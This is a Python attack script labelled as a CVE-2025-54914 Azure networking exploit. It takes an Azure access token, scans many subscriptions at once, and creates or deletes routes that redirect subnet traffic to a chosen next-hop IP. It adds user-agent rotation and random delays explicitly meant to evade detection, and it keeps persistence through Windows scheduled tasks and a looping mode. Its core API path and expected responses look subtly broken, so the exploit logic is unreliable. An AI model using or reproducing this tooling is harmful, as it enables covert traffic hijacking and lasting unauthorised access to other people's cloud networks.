#!/usr/bin/env python3
"""
CVE-2025-54914 Azure Networking Route Exploit
License: Research/Educational Use Only
"""

import requests
import json
import uuid
import argparse
import logging
import os
import subprocess
import time
import random
import threading
import queue
import hashlib
import base64
import sys
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal
import atexit
import tempfile
import shutil
from pathlib import Path

# Enhanced logging configuration
class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors for different log levels"""

    COLORS = {
        'DEBUG': '\033[36m',    # Cyan
        'INFO': '\033[32m',     # Green
        'WARNING': '\033[33m',  # Yellow
        'ERROR': '\033[31m',    # Red
        'CRITICAL': '\033[35m', # Magenta
        'RESET': '\033[0m'      # Reset
    }

    def format(self, record):
        log_color = self.COLORS.get(record.levelname, self.COLORS['RESET'])
        record.levelname = f"{log_color}{record.levelname}{self.COLORS['RESET']}"
        return super().format(record)

def setup_logging(level: str = 'INFO', log_file: Optional[str] = None) -> logging.Logger:
    """Setup enhanced logging with colors and file output"""
    logger = logging.getLogger(__name__)
    logger.setLevel(getattr(logging, level.upper()))

    # Clear existing handlers
    logger.handlers.clear()

    # Console handler with colors
    console_handler = logging.StreamHandler()
    console_formatter = ColoredFormatter('%(asctime)s | %(levelname)s | %(message)s',
                                       datefmt='%H:%M:%S')
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)

    # File handler if specified
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_formatter = logging.Formatter('%(asctime)s | %(levelname)s | %(message)s')
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)

    return logger

logger = setup_logging()

@dataclass
class TargetConfig:
    """Configuration for target Azure resources"""
    subscription_id: str
    resource_group: str
    vnet_name: str
    subnet_name: str
    route_name: Optional[str] = None
    address_prefix: str = '10.0.1.0/24'
    next_hop_type: str = 'VirtualAppliance'
    next_hop_ip: str = '10.0.2.5'
    api_version: str = '2025-09-01'
    priority: int = 1

@dataclass
class ExploitResult:
    """Result of exploit operation"""
    target: TargetConfig
    success: bool
    operation: str
    response_code: Optional[int] = None
    error_message: Optional[str] = None
    timestamp: datetime = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()

class EvasionManager:
    """Manages evasion techniques to avoid detection"""

    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        self.request_delays = (0.5, 2.0)  # Random delay range in seconds

    def get_random_user_agent(self) -> str:
        """Get random user agent for request headers"""
        return random.choice(self.user_agents)

    def get_random_delay(self) -> float:
        """Get random delay for request timing"""
        return random.uniform(*self.request_delays)

    def add_evasion_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Add evasion headers to requests"""
        evasion_headers = {
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        headers.update(evasion_headers)
        return headers

class PersistenceManager:
    """Manages persistence mechanisms for long-term access"""

    def __init__(self, config_file: str = '.exploit_config.json'):
        self.config_file = config_file
        self.session_file = '.exploit_session.json'
        self.load_config()

    def load_config(self) -> Dict[str, Any]:
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.warning(f"Failed to load config: {e}")
        return {}

    def save_config(self, config: Dict[str, Any]) -> None:
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            logger.debug(f"Configuration saved to {self.config_file}")
        except Exception as e:
            logger.error(f"Failed to save config: {e}")

    def save_session(self, session_data: Dict[str, Any]) -> None:
        """Save session data for persistence"""
        try:
            with open(self.session_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            logger.debug(f"Session data saved to {self.session_file}")
        except Exception as e:
            logger.error(f"Failed to save session: {e}")

    def load_session(self) -> Dict[str, Any]:
        """Load session data"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.warning(f"Failed to load session: {e}")
        return {}

    def create_scheduled_task(self, script_path: str, interval_minutes: int = 60) -> bool:
        """Create scheduled task for persistence (Windows)"""
        try:
            if os.name == 'nt':  # Windows
                task_name = f"AzureRouteExploit_{uuid.uuid4().hex[:8]}"
                cmd = [
                    'schtasks', '/create',
                    '/tn', task_name,
                    '/tr', f'python "{script_path}" --persistence-mode',
                    '/sc', 'minute',
                    '/mo', str(interval_minutes),
                    '/f'
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    logger.info(f"Scheduled task created: {task_name}")
                    return True
        except Exception as e:
            logger.error(f"Failed to create scheduled task: {e}")
        return False

class MultiTargetScanner:
    """Scans multiple targets for vulnerability"""

    def __init__(self, max_workers: int = 10):
        self.max_workers = max_workers
        self.results_queue = queue.Queue()
        self.evasion = EvasionManager()

    def scan_target(self, target: TargetConfig, access_token: str) -> ExploitResult:
        """Scan individual target for vulnerability"""
        try:
            # Add random delay for evasion
            time.sleep(self.evasion.get_random_delay())

            # Test if target is accessible
            base_url = f"https://management.azure.com/subscriptions/{target.subscription_id}"
            url = f"{base_url}/resourceGroups/{target.resource_group}/providers/Microsoft.Network/virtualNetworks/{target.vnet_name}/subnets/{target.subnet_name}"
            params = {'api-version': target.api_version}

            headers = {
                "Authorization": f"Bearer {access_token}",
                "Content-Type": "application/json"
            }
            headers = self.evasion.add_evasion_headers(headers)

            response = requests.get(url, params=params, headers=headers, timeout=30)

            if response.status_code == 200:
                return ExploitResult(
                    target=target,
                    success=True,
                    operation="scan",
                    response_code=response.status_code
                )
            else:
                return ExploitResult(
                    target=target,
                    success=False,
                    operation="scan",
                    response_code=response.status_code,
                    error_message=f"HTTP {response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                target=target,
                success=False,
                operation="scan",
                error_message=str(e)
            )

    def scan_targets(self, targets: List[TargetConfig], access_token: str) -> List[ExploitResult]:
        """Scan multiple targets concurrently"""
        results = []

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_target = {
                executor.submit(self.scan_target, target, access_token): target
                for target in targets
            }

            for future in as_completed(future_to_target):
                try:
                    result = future.result()
                    results.append(result)
                    self.results_queue.put(result)
                except Exception as e:
                    target = future_to_target[future]
                    error_result = ExploitResult(
                        target=target,
                        success=False,
                        operation="scan",
                        error_message=str(e)
                    )
                    results.append(error_result)

        return results

class AzureRouteExploit:
    """Enhanced Azure Route Exploit with commercial-grade features"""

    def __init__(self, config_file: Optional[str] = None):
        self.evasion = EvasionManager()
        self.persistence = PersistenceManager(config_file)
        self.scanner = MultiTargetScanner()
        self.session = requests.Session()
        self.session.verify = True  # SSL verification enabled
        self.results: List[ExploitResult] = []

        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        atexit.register(self._cleanup)

    def _signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully"""
        logger.info("Received shutdown signal, cleaning up...")
        self._cleanup()
        sys.exit(0)

    def _cleanup(self):
        """Cleanup resources on exit"""
        try:
            if hasattr(self, 'session'):
                self.session.close()
            logger.info("Cleanup completed")
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")

    def get_access_token(self, token: Optional[str] = None) -> str:
        """Get Azure access token with enhanced error handling"""
        if token:
            return token

        try:
            # Try Azure CLI first
            result = subprocess.run([
                'az', 'account', 'get-access-token',
                '--resource', 'https://management.azure.com/',
                '--query', 'accessToken',
                '--output', 'tsv'
            ], capture_output=True, text=True, check=True, timeout=30)

            token = result.stdout.strip()
            if token:
                logger.info("Successfully obtained access token from Azure CLI")
                return token

        except subprocess.CalledProcessError as e:
            logger.error(f"Azure CLI failed: {e.stderr}")
        except subprocess.TimeoutExpired:
            logger.error("Azure CLI command timed out")
        except FileNotFoundError:
            logger.error("Azure CLI not found")

        # Try environment variable
        env_token = os.getenv('AZURE_ACCESS_TOKEN')
        if env_token:
            logger.info("Using access token from environment variable")
            return env_token

        raise Exception("No valid access token found. Install Azure CLI or set AZURE_ACCESS_TOKEN environment variable.")

    def create_route(self, target: TargetConfig, access_token: str, dry_run: bool = False) -> ExploitResult:
        """Create route with enhanced error handling and evasion"""
        base_url = f"https://management.azure.com/subscriptions/{target.subscription_id}"
        url = f"{base_url}/resourceGroups/{target.resource_group}/providers/Microsoft.Network/virtualNetworks/{target.vnet_name}/subnets/{target.subnet_name}/routes"
        params = {'api-version': target.api_version, 'detailLevel': 'full'}

        # Generate route name if not provided
        route_name = target.route_name or f"exploit-route-{uuid.uuid4().hex[:8]}"

        payload = {
            "properties": {
                "addressPrefix": target.address_prefix,
                "nextHopType": target.next_hop_type,
                "nextHopIpAddress": target.next_hop_ip
            },
            "name": route_name
        }

        headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json"
        }
        headers = self.evasion.add_evasion_headers(headers)

        if dry_run:
            logger.info(f"Dry run: Would POST to {url}")
            logger.info(f"Payload: {json.dumps(payload, indent=2)}")
            return ExploitResult(
                target=target,
                success=True,
                operation="create_route",
                response_code=200
            )

        try:
            # Add random delay for evasion
            time.sleep(self.evasion.get_random_delay())

            response = self.session.post(url, params=params, json=payload, headers=headers, timeout=30)

            if response.status_code == 201:
                logger.info(f"Route '{route_name}' created successfully on {target.subscription_id}")
                return ExploitResult(
                    target=target,
                    success=True,
                    operation="create_route",
                    response_code=response.status_code
                )
            else:
                logger.warning(f"Unexpected status: {response.status_code}")
                return ExploitResult(
                    target=target,
                    success=False,
                    operation="create_route",
                    response_code=response.status_code,
                    error_message=response.text
                )

        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
            return ExploitResult(
                target=target,
                success=False,
                operation="create_route",
                error_message=str(e)
            )

    def delete_route(self, target: TargetConfig, access_token: str, dry_run: bool = False) -> ExploitResult:
        """Delete route with enhanced error handling"""
        base_url = f"https://management.azure.com/subscriptions/{target.subscription_id}"
        url = f"{base_url}/resourceGroups/{target.resource_group}/providers/Microsoft.Network/virtualNetworks/{target.vnet_name}/subnets/{target.subnet_name}/routes/{target.route_name}"
        params = {'api-version': target.api_version}

        headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json"
        }
        headers = self.evasion.add_evasion_headers(headers)

        if dry_run:
            logger.info(f"Dry run: Would DELETE {url}")
            return ExploitResult(
                target=target,
                success=True,
                operation="delete_route",
                response_code=200
            )

        try:
            # Add random delay for evasion
            time.sleep(self.evasion.get_random_delay())

            response = self.session.delete(url, params=params, headers=headers, timeout=30)

            if response.status_code in (200, 204):
                logger.info(f"Route '{target.route_name}' deleted successfully from {target.subscription_id}")
                return ExploitResult(
                    target=target,
                    success=True,
                    operation="delete_route",
                    response_code=response.status_code
                )
            else:
                logger.warning(f"Unexpected status: {response.status_code}")
                return ExploitResult(
                    target=target,
                    success=False,
                    operation="delete_route",
                    response_code=response.status_code,
                    error_message=response.text
                )

        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
            return ExploitResult(
                target=target,
                success=False,
                operation="delete_route",
                error_message=str(e)
            )

    def scan_targets(self, targets: List[TargetConfig], access_token: str) -> List[ExploitResult]:
        """Scan multiple targets for vulnerability"""
        logger.info(f"Scanning {len(targets)} targets...")
        results = self.scanner.scan_targets(targets, access_token)

        successful_targets = [r for r in results if r.success]
        failed_targets = [r for r in results if not r.success]

        logger.info(f"Scan completed: {len(successful_targets)} successful, {len(failed_targets)} failed")

        return results

    def exploit_targets(self, targets: List[TargetConfig], access_token: str,
                       operation: str = 'create', dry_run: bool = False) -> List[ExploitResult]:
        """Exploit multiple targets concurrently"""
        results = []

        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_target = {}

            for target in targets:
                if operation == 'create':
                    future = executor.submit(self.create_route, target, access_token, dry_run)
                elif operation == 'delete':
                    future = executor.submit(self.delete_route, target, access_token, dry_run)
                else:
                    continue

                future_to_target[future] = target

            for future in as_completed(future_to_target):
                try:
                    result = future.result()
                    results.append(result)
                    self.results.append(result)
                except Exception as e:
                    target = future_to_target[future]
                    error_result = ExploitResult(
                        target=target,
                        success=False,
                        operation=operation,
                        error_message=str(e)
                    )
                    results.append(error_result)
                    self.results.append(error_result)

        return results

    def generate_report(self, output_file: Optional[str] = None) -> str:
        """Generate detailed exploit report"""
        report = []
        report.append("=" * 80)
        report.append("CVE-2025-54914 Azure Route Exploit Report")
        report.append("=" * 80)
        report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total Operations: {len(self.results)}")

        successful = [r for r in self.results if r.success]
        failed = [r for r in self.results if not r.success]

        report.append(f"Successful: {len(successful)}")
        report.append(f"Failed: {len(failed)}")
        report.append("")

        if successful:
            report.append("SUCCESSFUL OPERATIONS:")
            report.append("-" * 40)
            for result in successful:
                report.append(f"Target: {result.target.subscription_id}")
                report.append(f"Operation: {result.operation}")
                report.append(f"Resource Group: {result.target.resource_group}")
                report.append(f"VNet: {result.target.vnet_name}")
                report.append(f"Subnet: {result.target.subnet_name}")
                report.append(f"Timestamp: {result.timestamp}")
                report.append("")

        if failed:
            report.append("FAILED OPERATIONS:")
            report.append("-" * 40)
            for result in failed:
                report.append(f"Target: {result.target.subscription_id}")
                report.append(f"Operation: {result.operation}")
                report.append(f"Error: {result.error_message}")
                report.append(f"Timestamp: {result.timestamp}")
                report.append("")

        report_text = "\n".join(report)

        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write(report_text)
                logger.info(f"Report saved to {output_file}")
            except Exception as e:
                logger.error(f"Failed to save report: {e}")

        return report_text

def load_targets_from_file(file_path: str) -> List[TargetConfig]:
    """Load targets from JSON file"""
    try:
        with open(file_path, 'r') as f:
            data = json.load(f)

        targets = []
        for item in data.get('targets', []):
            target = TargetConfig(**item)
            targets.append(target)

        logger.info(f"Loaded {len(targets)} targets from {file_path}")
        return targets

    except Exception as e:
        logger.error(f"Failed to load targets from {file_path}: {e}")
        return []

def main():
    """Main function with enhanced argument parsing"""
    parser = argparse.ArgumentParser(
        description='CVE-2025-54914 Azure Networking Route Exploit - Enhanced Version',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target exploit
  python exploit_enhanced.py --subscription-id sub123 --resource-group rg1 --vnet-name vnet1 --subnet-name subnet1

  # Multi-target from file
  python exploit_enhanced.py --targets-file targets.json --operation create

  # Scan mode
  python exploit_enhanced.py --targets-file targets.json --scan-only

  # Persistence mode
  python exploit_enhanced.py --persistence-mode --interval 30

  # Dry run
  python exploit_enhanced.py --subscription-id sub123 --resource-group rg1 --vnet-name vnet1 --subnet-name subnet1 --dry-run
        """
    )

    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('--subscription-id', help='Azure subscription ID')
    target_group.add_argument('--targets-file', help='JSON file containing target configurations')

    parser.add_argument('--resource-group', help='Resource group name')
    parser.add_argument('--vnet-name', help='Virtual network name')
    parser.add_argument('--subnet-name', help='Subnet name')

    # Route configuration
    parser.add_argument('--route-name', default=str(uuid.uuid4()), help='Route name (default: UUID)')
    parser.add_argument('--address-prefix', default='10.0.1.0/24', help='Address prefix')
    parser.add_argument('--next-hop-type', default='VirtualAppliance', help='Next hop type')
    parser.add_argument('--next-hop-ip', default='10.0.2.5', help='Next hop IP address')
    parser.add_argument('--api-version', default='2025-09-01', help='API version')

    # Operation mode
    parser.add_argument('--operation', choices=['create', 'delete'], default='create', help='Operation to perform')
    parser.add_argument('--scan-only', action='store_true', help='Only scan targets, do not exploit')
    parser.add_argument('--persistence-mode', action='store_true', help='Enable persistence mode')
    parser.add_argument('--interval', type=int, default=60, help='Persistence interval in minutes')

    # Evasion and stealth
    parser.add_argument('--max-workers', type=int, default=10, help='Maximum concurrent workers')
    parser.add_argument('--delay-min', type=float, default=0.5, help='Minimum delay between requests')
    parser.add_argument('--delay-max', type=float, default=2.0, help='Maximum delay between requests')

    # Output and logging
    parser.add_argument('--token', help='Bearer token (optional, uses az CLI if not provided)')
    parser.add_argument('--dry-run', action='store_true', help='Dry run without sending requests')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], default='INFO', help='Log level')
    parser.add_argument('--log-file', help='Log file path')
    parser.add_argument('--report-file', help='Output report file path')
    parser.add_argument('--config-file', help='Configuration file path')

    args = parser.parse_args()

    # Setup logging
    global logger
    logger = setup_logging(args.log_level, args.log_file)

    try:
        # Initialize exploit
        exploit = AzureRouteExploit(args.config_file)

        # Get access token
        access_token = exploit.get_access_token(args.token)

        # Load targets
        targets = []
        if args.targets_file:
            targets = load_targets_from_file(args.targets_file)
        elif args.subscription_id:
            target = TargetConfig(
                subscription_id=args.subscription_id,
                resource_group=args.resource_group,
                vnet_name=args.vnet_name,
                subnet_name=args.subnet_name,
                route_name=args.route_name,
                address_prefix=args.address_prefix,
                next_hop_type=args.next_hop_type,
                next_hop_ip=args.next_hop_ip,
                api_version=args.api_version
            )
            targets = [target]

        if not targets:
            logger.error("No targets specified")
            return 1

        # Configure evasion
        exploit.evasion.request_delays = (args.delay_min, args.delay_max)
        exploit.scanner.max_workers = args.max_workers

        # Persistence mode
        if args.persistence_mode:
            logger.info("Starting persistence mode...")
            while True:
                try:
                    if args.scan_only:
                        results = exploit.scan_targets(targets, access_token)
                    else:
                        results = exploit.exploit_targets(targets, access_token, args.operation, args.dry_run)

                    logger.info(f"Persistence cycle completed. Sleeping for {args.interval} minutes...")
                    time.sleep(args.interval * 60)

                except KeyboardInterrupt:
                    logger.info("Persistence mode interrupted by user")
                    break
                except Exception as e:
                    logger.error(f"Error in persistence mode: {e}")
                    time.sleep(60)  # Wait 1 minute before retry
        else:
            # Single execution mode
            if args.scan_only:
                results = exploit.scan_targets(targets, access_token)
            else:
                results = exploit.exploit_targets(targets, access_token, args.operation, args.dry_run)

            # Generate report
            report = exploit.generate_report(args.report_file)
            if not args.report_file:
                print(report)

        # Save session data
        session_data = {
            'timestamp': datetime.now().isoformat(),
            'targets_count': len(targets),
            'results_count': len(exploit.results),
            'successful_count': len([r for r in exploit.results if r.success])
        }
        exploit.persistence.save_session(session_data)

        logger.info("Operation completed successfully")
        return 0

    except Exception as e:
        logger.error(f"Error: {e}")
        return 1

if __name__ == '__main__':
    sys.exit(main())
